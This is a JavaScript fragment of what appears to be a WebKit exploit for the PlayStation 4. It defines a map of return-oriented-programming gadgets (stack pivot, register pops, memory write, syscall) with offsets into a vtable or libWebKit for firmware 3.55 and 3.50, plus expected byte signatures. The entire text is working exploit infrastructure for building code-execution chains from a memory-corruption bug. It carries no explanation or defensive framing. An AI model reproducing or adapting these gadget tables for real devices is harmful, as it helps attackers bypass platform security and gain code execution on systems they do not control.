gadgetMap = {
  'PlayStation 4 3.55': {
      'xchg rax, rsp; dec dword ptr [rax - 0x77]': new gadget(VTABLE, -0x18a353f),
      'pop rcx; pop rcx': new gadget(VTABLE, -0x5e970c),
      'pop rcx': new gadget(VTABLE, -0xab7d4c),
      'add dword ptr [rax - 0x77], ecx': new gadget(VTABLE, -0x18c3d40),
      'pop rdi': new gadget(VTABLE, -0x11d1d76),
      'mov qword ptr [rdi], rax': new gadget(VTABLE, -0x2372c99),
      'pop rsi': new gadget(VTABLE, -0x88d954),
      'pop rdx': new gadget(VTABLE, -0xac2f8e),
      'pop rax': new gadget(VTABLE, -0x5e9bfd),
      'syscall': new gadget(VTABLE, -0x3dc1a6),
      'pop rsp': new gadget(VTABLE, -0x1abc011),
      'mov rax, qword ptr [rax]': new gadget(VTABLE, -0x238e98d),
      'pop r8': new gadget(VTABLE, -0x15ca007),
      'pop r9': new gadget(VTABLE, -0x17202f1),
  },
  'PlayStation 4 3.50': {
      'xchg rax, rsp; dec dword ptr [rax - 0x77]': new gadget(LIBWEBKIT, 0x15d771 + 0xC00000, [0x48, 0x94, 0xFF, 0x48, 0x89]),
      'pop rcx; pop rcx': new gadget(LIBWEBKIT, 0x93303 + 0xC00000, [0x59, 0x59]),
      'pop rcx': new gadget(LIBWEBKIT, 0x3ca9fd, [0x59]),
      'add dword ptr [rax - 0x77], ecx': new gadget(LIBWEBKIT, 0x55ac, [0x01, 0x48, 0x89]),
      'pop rdi': new gadget(LIBWEBKIT, 0x113991, [0x5f]),
      'mov qword ptr [rdi], rax': new gadget(LIBWEBKIT, 0x11fc37, [0x48, 0x89, 0x07]),
      'pop rsi': new gadget(LIBWEBKIT, 0xb9ebb, [0x5E]),
      'pop rdx': new gadget(LIBWEBKIT, 0x1afa, [0x5A]),
      'pop rax': new gadget(LIBWEBKIT, 0x1c6ab, [0x58]),
      'syscall': new gadget(LIBWEBKIT, 0x700c8, [0x0F, 0x05]),
      'pop rsp': new gadget(LIBWEBKIT, 0x376850, [0x5C]),
      'mov rax, qword ptr [rax]': new gadget(LIBWEBKIT, 0x4add2, [0x48, 0x8B, 0x00]),
      'pop r8': new gadget(LIBWEBKIT, 0x2b3022, [0x47, 0x58]),
    //'pop r9': new gadget(VTABLE, -0x17202f1, [0x41, 0x59])
  }
}

